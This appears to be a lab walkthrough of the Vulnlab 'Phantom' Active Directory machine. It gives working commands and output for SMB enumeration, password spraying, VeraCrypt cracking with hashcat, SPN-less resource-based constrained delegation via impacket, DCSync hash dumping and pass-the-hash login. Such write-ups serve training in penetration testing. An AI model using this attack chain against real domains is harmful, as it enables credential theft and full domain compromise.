---
title: "Phantom — Vulnlab Full Walkthrough (TjNull list)"
date: 2024-09-10 12:00:00 +0500
image:
    path: "https://miro.medium.com/v2/resize:fit:640/format:webp/1*EQOv14QlzaUAymEqNB97Zw.png"
    alt: Phantom - Cover Image
toc: true
comments: true
tags: active-directory-chain resource-based-contrained-delegation rbcd-without-spn hashcat-veracrypt-cracking bloodhound-allowtoact active-directory-password-spray
categories: ["HackTheBox"]
description: "This writeup covers a comprehensive, multi-step penetration testing assessment targeting a complex enterprise network. The attack path demonstrates how minor initial oversights—such as unauthenticated network shares and weak password policies—can chain together to allow a complete takeover of an Active Directory domain. The compromise lifecycle moves from basic SMB enumeration and password spraying to offline cryptographic cracking and advanced Resource-Based Constrained Delegation (RBCD) exploitation."
---

Welcome Reader, Today we’ll hack Phantom from Vulnlab. Windows — Medium (ar0x4).

Enumeration
-----------

Let’s start with a full port nmap scan.

```shell
Nmap scan report for 10.10.74.183 (10.10.74.183)
Host is up, received user-set (0.18s latency).
Scanned at 2024-10-10 09:21:38 PKT for 619s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-10 04:29:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   DNS_Tree_Name: phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-10-10T04:31:13+00:00
| ssl-cert: Subject: commonName=DC.phantom.vl
| Issuer: commonName=DC.phantom.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-05T19:49:21
| Not valid after:  2025-01-04T19:49:21
| MD5:   20b2:6e9b:d25b:051a:c734:2ea8:1929:cebe
| SHA-1: 8a5d:0167:e13a:84de:8d99:d55e:71ca:4967:d5ed:59b8
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQYf5wIHhjqJ5IA4lUSwlUIzANBgkqhkiG9w0BAQsFADAY
| MRYwFAYDVQQDEw1EQy5waGFudG9tLnZsMB4XDTI0MDcwNTE5NDkyMVoXDTI1MDEw
| NDE5NDkyMVowGDEWMBQGA1UEAxMNREMucGhhbnRvbS52bDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAMA8vPTkukVbvxXxp/V+N7cx+cequ2q7oT0am6tO
| UHH37XVXO6x2Ndt8hK9ty4gBr1BFbjCGX21TIa1C7IEe95IvpCMIbxUdaqMGss4Y
| EnFiJJiH6HdjEaHmms5ENzQdPldz3cBfIfagK1pTUUVynFzheRIIk/Y5D5X4GSxr
| Utr7wTIZn0rc/3yZSdVi3fCcDKBACwIInYr0S/N9fFb03OO7wi2+vs/Qiq49yxar
| TD/GR5SMOdR+ZK+Pw+fFPn04NCGIL6WrQFczR3Z3/w+paD+k7LFuoiLcB59w9+et
| NFf0kV/zYX2AJv9PCznmHtfwjWBk6aitJ5CHysvjst1Gpx0CAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IB
| AQBYK45hNioFPjz9IpeVs5rybWi9AcDIUJamsU+csyv5o/goVRmf3j7lR7fG2coT
| WIYHRJhaz0/TLzbxWi9ux5lHmvXfr3aiBQKTo3K2HE0PCnUJ+yCftN19tm2vMvi8
| sMKuXuAShgyrbvg49njeTbBHi5q1nNZlS8m6ZxBnZ1eEFZoqVMqTMtd5T4XyyaOC
| OeDWvrXiZcMIJdZGAofTYDQjgrkG1yKxIZ32cZpp8OtDncRxfv+PEoH08B0oeRtk
| GCc7C4WEkMsjNMcfjNmMO0tRlhOU19YlRANffaM0gtDfRTqV7xos8XIqX+3JuZWf
| gkuzd+cf8gfrRullHsu18Ik/
|_-----END CERTIFICATE-----
|_ssl-date: 2024-10-10T04:31:51+00:00; -1s from scanner time.
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49834/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```
{: .nolineno}

### SMB — 445

Listing SMB shares with anonymous access.

```shell
/home/daffy 10.8.3.192 # crackmapexec smb 10.10.74.183 -u guest -p '' --shares
SMB         10.10.74.183    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.183    445    DC               [+] phantom.vl\guest:
SMB         10.10.74.183    445    DC               [+] Enumerated shares
SMB         10.10.74.183    445    DC               Share           Permissions     Remark
SMB         10.10.74.183    445    DC               -----           -----------     ------
SMB         10.10.74.183    445    DC               ADMIN$                          Remote Admin
SMB         10.10.74.183    445    DC               C$                              Default share
SMB         10.10.74.183    445    DC               Departments Share
SMB         10.10.74.183    445    DC               IPC$            READ            Remote IPC
SMB         10.10.74.183    445    DC               NETLOGON                        Logon server share
SMB         10.10.74.183    445    DC               Public          READ
SMB         10.10.74.183    445    DC               SYSVOL                          Logon server share
```
{: .nolineno}

We have read access to `Public` and `IPC$`. Public share looks more interesting let’s take a look at Public share.

```shell
/home/daffy 10.8.3.192 # impacket-smbclient phantom.vl/guest@phantom.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
Password:
Type help for list of commands
# use Public
# ls
drw-rw-rw-          0  Thu Jul 11 20:03:14 2024 .
drw-rw-rw-          0  Sun Jul  7 13:39:30 2024 ..
-rw-rw-rw-      14565  Sat Jul  6 21:09:28 2024 tech_support_email.eml
# get tech_support_email.eml
```
{: .nolineno}

I found a `tech_support_email.eml` file and downloaded it to my attacking machine. Looking at the file it’s an email from Lucas asking to use a new template he made.

![Email from Lucas](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UjcNTv5gFz7-GtXvLdtIWQ.png)

He also attached the template as base64 let’s decode it. I saved the base64 text and converted it back to PDF.

```shell
cat file-base64 | base64 -d > welcome_template.pdf
```
{: .nolineno}

![Template PDF](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C1YNOeMswopisTSRpMg1tg.png)

There is a password in the template as well. I used rid-brute to fetch users from the domain and stored them in a file.

```shell
crackmapexec smb 10.10.74.183 -u guest -p '' --rid-brute
```
{: .nolineno}

Now we can spray that password against all the users using [crackmapexec](https://www.google.com/url?sa=t&rct=j&opi=89978449&url=https%3A%2F%2Fgithub.com%2Fbyt3bl33d3r%2FCrackMapExec&ved=2ahUKEwjJ_tyrgIOJAxXjnf0HHQMlDfEQFnoECAgQAQ&usg=AOvVaw1IBbqoL4H_g76Vj72MLgN4).

```shell
/home/daffy/Documents/Raw 10.8.3.192 # crackmapexec smb 10.10.74.183 -u users -p '<REDACTED>' --continue-on-success
SMB         10.10.74.183    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
< ... SNIP ... >
SMB         10.10.74.183    445    DC               [-] phantom.vl\ppayne:<REDACTED> STATUS_LOGON_FAILURE 
SMB         10.10.74.183    445    DC               [+] phantom.vl\ibryant:<REDACTED> <-- Password Found 
SMB         10.10.74.183    445    DC               [-] phantom.vl\ssteward:<REDACTED> STATUS_LOGON_FAILURE 
SMB         10.10.74.183    445    DC               [-] phantom.vl\wstewart:<REDACTED> STATUS_LOGON_FAILURE 
SMB         10.10.74.183    445    DC               [-] phantom.vl\vhoward:<REDACTED> STATUS_LOGON_FAILURE 
SMB         10.10.74.183    445    DC               [-] phantom.vl\crose:<REDACTED> STATUS_LOGON_FAILURE
< ... SNIP ... >
```
{: .nolineno}

### VeraCrypt

Listing SMB shares again with new user `ibryant`.

```shell
/home/daffy/Documents/Raw 10.8.3.192 # crackmapexec smb 10.10.74.183 -u ibryant -p '<REDACTED>' --shares
SMB         10.10.74.183    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.74.183    445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
SMB         10.10.74.183    445    DC               [+] Enumerated shares
SMB         10.10.74.183    445    DC               Share           Permissions     Remark
SMB         10.10.74.183    445    DC               -----           -----------     ------
SMB         10.10.74.183    445    DC               ADMIN$                          Remote Admin
SMB         10.10.74.183    445    DC               C$                              Default share
SMB         10.10.74.183    445    DC               Departments Share READ
SMB         10.10.74.183    445    DC               IPC$            READ            Remote IPC
SMB         10.10.74.183    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.74.183    445    DC               Public          READ
SMB         10.10.74.183    445    DC               SYSVOL          READ            Logon server share
```
{: .nolineno}

While enumerating `Departments Share` I found a VeraCrypt file under `Departments Share/IT/Backup/IT_BACKUP_201123.hc`. There is a VeraCrypt deb file that we can use to install it on out attacking machine and mount the VeraCrypt file. We can [download](https://www.veracrypt.fr/en/Downloads.html) a different version as well as per our system requirements.

> **VeraCrypt** is a free, open-source disk encryption tool that helps protect data from unauthorized access. [read more](https://en.wikipedia.org/wiki/VeraCrypt#:~:text=VeraCrypt%20is%20a%20free%20and,device%20with%20pre%2Dboot%20authentication.)
{: .prompt-tip}

```shell
/home/daffy/Downloads 10.8.3.192 # impacket-smbclient phantom.vl/ibryant:'<REDACTED>'@phantom.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
Type help for list of commands
# use Departments Share
# ls
drw-rw-rw-          0  Sat Jul  6 21:25:31 2024 .
drw-rw-rw-          0  Sun Jul  7 13:39:30 2024 ..
drw-rw-rw-          0  Sat Jul  6 21:25:11 2024 Finance
drw-rw-rw-          0  Sat Jul  6 21:21:31 2024 HR
drw-rw-rw-          0  Thu Jul 11 19:59:02 2024 IT
# cd IT/Backup
# ls
drw-rw-rw-          0  Sat Jul  6 23:04:34 2024 .
drw-rw-rw-          0  Thu Jul 11 19:59:02 2024 ..
-rw-rw-rw-   12582912  Sat Jul  6 23:04:34 2024 IT_BACKUP_201123.hc
```
{: .nolineno}

The file is password protected time to do some cracking ;) Now if we use the rockyou password list it’ll take very long so I did some thinking and used some combinations like year and special characters with company name. Let’s create a password list.

```shell
phantom
Phantom
Ph4ntom
Ph4nt0m
```
{: .nolineno}

A rule as well to add the year and special characters.

```shell
$2 $0 $2 $3 $!
$2 $0 $2 $3 $@
$2 $0 $2 $3 $#
$2 $0 $2 $3 $$
$2 $0 $2 $3 $%
$2 $0 $2 $3 $^
$2 $0 $2 $3 $&
$2 $0 $2 $3 $*
$2 $0 $2 $3 $(
$2 $0 $2 $3 $)
$2 $0 $2 $3 $-
$2 $0 $2 $3 $=
$2 $0 $2 $3 $+
```
{: .nolineno}

Let’s give it a go.

```shell
~ $ hashcat -m 13721 IT_BACKUP_201123.hc passwords -r phantom.rule
...SNIP...
IT_BACKUP_201123.hc:<REDACTED>                          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))
Hash.Target......: IT_BACKUP_201123.hc
Time.Started.....: Thu Oct 10 11:15:40 2024 (6 secs)
Time.Estimated...: Thu Oct 10 11:15:46 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords)
Guess.Mod........: Rules (phantom.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        1 H/s (0.28ms) @ Accel:256 Loops:62 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4/52 (7.69%)
Rejected.........: 0/4 (0.00%)
Restore.Point....: 0/4 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:499968-499999
Candidate.Engine.: Device Generator
Candidates.#1....: phantom2023! -> Ph4nt0m2023!
Hardware.Mon.#1..: Temp: 48c Util: 78% Core:1830MHz Mem:6000MHz Bus:8
Started: Thu Oct 10 11:15:33 2024
Stopped: Thu Oct 10 11:15:47 2024
```
{: .nolineno}

We successfully cracked the password. Let’s mount the file and see what’s hidden in there.

Initial Foothold
----------------

I copied the `vyos_backup.tar.gz` to my local storage and unziped it and found a password of user `lstanley` under `/config/config.boot`

```shell
        authentication {
            local-users {
                username lstanley {
                    password "<REDACTED>"
                }
            }
```
{: .nolineno}

I couldn’t login anywhere with user so I brute forced the password once again using crackmapexec.

```shell
~ $ crackmapexec smb phantom.vl -u users -p '<REDACTED>' --continue-on-success
SMB         phantom.vl      445    DC               [+] phantom.vl\svc_sspr:<REDACTED> 
```
{: .nolineno}

Now we can login with `winrm` I used bloodhound-python to enumerate the Active Directory. We got our user flag as well.

```shell
*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> more user.txt
VL{<FLAGGED>}
```
{: .nolineno}

```shell
/home/daffy/Documents/Raw 10.8.3.192 # bloodhound-python -u "ibryant" -p '<REDACTED>' -d phantom.vl -c all --zip -ns 10.10.74.183
INFO: Found AD domain: phantom.vl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.phantom.vl:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.phantom.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.phantom.vl
INFO: Found 30 users
INFO: Found 61 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.phantom.vl
INFO: Done in 00M 42S
INFO: Compressing output into 20241010114830_bloodhound.zip
```
{: .nolineno}

Privilege Escalation
--------------------

The user `svc_sspr` can **ForceChangePassword** of wsilva and two other user and all of them are member of `ict security` group.

![SVC_SSPR →WSILVA → ICT SECURITY](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eGOwggg2E13L9yKTafs0Fw.png)

`ict security` group has **AddAllowedToAct** Object Control over `dc.phantom.vl` which we can abuse to obtain administrator privileges by performing a **Resource-based constrained** attack**.**

![ICT SECURITY → AddAllowedToAct](https://miro.medium.com/v2/resize:fit:894/format:webp/1*n2kO-Met0iy8lOPwpYKAsg.png)

### ForceChangePassword

We will use [net](https://www.samba.org/samba/docs/current/man-html/net.8.html) binary for this one. Net is a tool for administration of Samba and remote CIFS servers.

```shell
~ $ net rpc password "WSILVA" 'Admin123!' -U phantom.vl/svc_sspr%<REDACTED> -S phantom.vl
```
{: .nolineno}

No error means the command ran successfully.

### Resource-based constrained (RBCD) SPN-LESS

This article [here](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users) explains this attack very well. First, we have to do the normal RBCD, and instead of a passing a machine account in the `-delegate-from` option, we will pass the user wsilva.

```shell
~ $ impacket-rbcd -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip '10.10.74.183' -action 'write' 'phantom.vl'/'wsilva':'Admin123!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                     
                                                                                                                                                                                          
[*] Accounts allowed to act on behalf of other identity:                                                                                                                                  
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)                                                                                                                     
[*] wsilva can already impersonate users on DC$ via S4U2Proxy                                                                                                                             
[*] Not modifying the delegation rights.                                                                                                                                                  
[*] Accounts allowed to act on behalf of other identity:                                                                                                                                  
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
```
{: .nolineno}

Then we need to obtain a TGT through overpass-the-hash to use RC4.

```shell
~ $ impacket-getTGT -hashes :$(pypykatz crypto nt 'Admin123!') 'phantom.vl'/'wsilva'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                     
                                                                                                                                                                                          
[*] Saving ticket in wsilva.ccache 
~ $ export KRB5CCNAME=wsilva.ccache
```
{: .nolineno}

Now the TGT session key.

```shell
~ $ impacket-describeTicket 'wsilva.ccache' | grep 'Ticket Session Key'                                                                                
[*] Ticket Session Key            : 0b13e9062cd35e8b5c8a01d0b33e379f
```
{: .nolineno}

Now we will Change the `controlledaccountwithoutSPN's` NT hash with the TGT session key.

```shell
~ $ impacket-changepasswd -newhashes :0b13e9062cd35e8b5c8a01d0b33e379f 'phantom.vl'/'wsilva':'Admin123!'@'phantom.vl'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Changing the password of phantom.vl\wsilva 
[*] Connecting to DCE/RPC as phantom.vl\wsilva 
[*] Password was changed successfully.
[!] User will need to change their password on next logging because we are using hashes.
```
{: .nolineno}

Obtaining the delegated service ticket through `S4U2self+U2U`, followed by `S4U2proxy`**.**

```shell
~ $ impacket-getST -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/DC.phantom.vl" 'phantom.vl'/'wsilva'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
~ $ export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```
{: .nolineno}

Now can can use that to perform DCSync attack and dump all the hashes including administrator NT hash.

```shell
~ $ crackmapexec smb dc.phantom.vl --use-kcache --ntds
SMB         phantom.vl      445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         phantom.vl      445    DC               [+] phantom.vl\ from ccache (Pwn3d!)
SMB         phantom.vl      445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         phantom.vl      445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
```
{: .nolineno}

Logging in using winrm and fetching the root flag.

```shell
~ $ evil-winrm -i phantom.vl -u Administrator -H <REDACTED>
                                        
Evil-WinRM shell v3.6
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> more ..\Desktop\root.txt
VL{<REDACTED>}
```
{: .nolineno}

We successfully [hacked](https://api.vulnlab.com/api/v1/share?id=82bd22db-54f6-48ff-93bc-ce8af3e0ea96) Phantom form Vulnlab. Thanks for reading.